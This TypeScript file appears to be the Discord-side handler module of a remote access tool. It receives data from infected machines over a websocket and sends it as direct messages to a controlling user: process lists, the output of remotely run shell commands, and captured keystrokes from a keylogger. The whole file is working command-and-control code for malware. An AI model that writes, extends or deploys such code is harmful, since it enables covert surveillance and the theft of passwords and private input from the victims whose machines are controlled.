import { type DiscordClient } from "@/clients/DiscordClient";
import { embeds, emojis } from "@/shared";
import { Logger } from "@/shared/Logger";
import {
	type GetCmdCommand,
	type WsTasksFromClient,
	type MessageEvent,
	type KeyLoggerEvent
} from "@/types/ws-events.types";
import { type Process } from "@/types/ws.types";
import { fromBytesToMB } from "@/utils";

export class WsOthersEvents {
	constructor(private readonly client: DiscordClient) {}

	getTasksFromClient = async (data: WsTasksFromClient) => {
		const { tasks, controllerid } = data;

		const owner = await this.client.users.fetch(controllerid);
		Logger.info("Get task from client event received", owner);
		Logger.info(data);

		function groupTasksByName(tasks: Process[]) {
			const groupedTasks: Record<string, Process> = {};

			// Count tasks and add 1 to counter if there are multiple tasks with the same name
			for (const task of tasks) {
				if (groupedTasks[task.name]) {
					groupedTasks[task.name].memory += task.memory;
					groupedTasks[task.name].count += 1;
				} else {
					groupedTasks[task.name] = { ...task, count: 1 };
				}
			}

			// Change name if there are multiple tasks with the same name
			const result: Record<string, Process> = {};
			for (const [name, task] of Object.entries(groupedTasks)) {
				const newName = task.count > 1 ? `${name} (${task.count}x)` : name;
				result[newName] = { ...task, name: newName };
			}

			// Sort result by memory usage
			const sortedTasks = Object.values(result).sort((a, b) => b.memory - a.memory);
			const sortedResult: Record<string, Process> = {};
			for (const task of sortedTasks) {
				sortedResult[task.name] = task;
			}

			return sortedResult;
		}

		try {
			if (owner) {
				const groupedTasks = groupTasksByName(tasks);
				const taskList = Object.values(groupedTasks)
					.slice(0, 20)
					.map(
						(task, idx) =>
							`${idx}. **Name:** ${task.name} - **Size:** ${fromBytesToMB(task.memory)} MB`
					)
					.join("\n");

				const tasksEmbed = {
					title: `Process List (by Highest Memory Usage)`,
					description: taskList,
					color: embeds.Colors.default,
					timestamp: new Date().toISOString()
				};

				await owner.send({ embeds: [tasksEmbed] });

				Logger.info(`Process list sent to owner with ID: ${controllerid}`);
			}
		} catch (error) {
			await owner.send(`Error sending tasks: ${error}`);
			Logger.error("Error sending tasks", error);
		}
	};

	getCmdCommand = async (data: GetCmdCommand) => {
		const { controllerid, path, output } = data;

		const owner = await this.client.users.fetch(controllerid);

		const MAX_LENGTH = 20000;
		const CHUNK_SIZE = 1900;
		if (output.length > MAX_LENGTH) {
			await owner.send(
				`${emojis.Warning} Command Output is too large to be sent (Over 20,000 characters).`
			);
		} else {
			for (let i = 0; i < output.length; i += CHUNK_SIZE) {
				const chunk = output.substring(i, i + CHUNK_SIZE);
				const embed = {
					title: `Command Output`,
					description: `\`\`\`${chunk}\`\`\``,
					color: embeds.Colors.default,
					timestamp: new Date().toISOString()
				};
				await owner.send({
					content: `${emojis.Info} Current path: \`${path}\``,
					embeds: [embed]
				});
			}
		}

		Logger.info("Get cmd command event received", owner);
		Logger.info(data);
	};

	reciveMessage = async (data: MessageEvent) => {
		const { controllerid, message, title } = data;

		const owner = await this.client.users.fetch(controllerid);

		const embed = {
			title,
			description: message,
			color: embeds.Colors.default,
			timestamp: new Date().toISOString()
		};

		await owner.send({ embeds: [embed] });

		// Logger.info(`Received message from WebSocket server: ${message}`);
	};

	reciveKeyLogger = async (data: KeyLoggerEvent) => {
		const { controllerid, keys } = data;

		const owner = await this.client.users.fetch(controllerid);
		try {
			const embed = {
				title: "Keylogger",
				description: `\`\`\`${keys.join("")}\`\`\``,
				color: embeds.Colors.default,
				timestamp: new Date().toISOString()
			};

			if (keys.length > 0) {
				Logger.info(`Keys: ${keys.join(", ")}`);
			} else {
				Logger.info("No keys received");
			}

			await owner.send({ embeds: [embed] });
		} catch (error) {
			Logger.error("Error sending keylogger data", error);
		}
	};
}
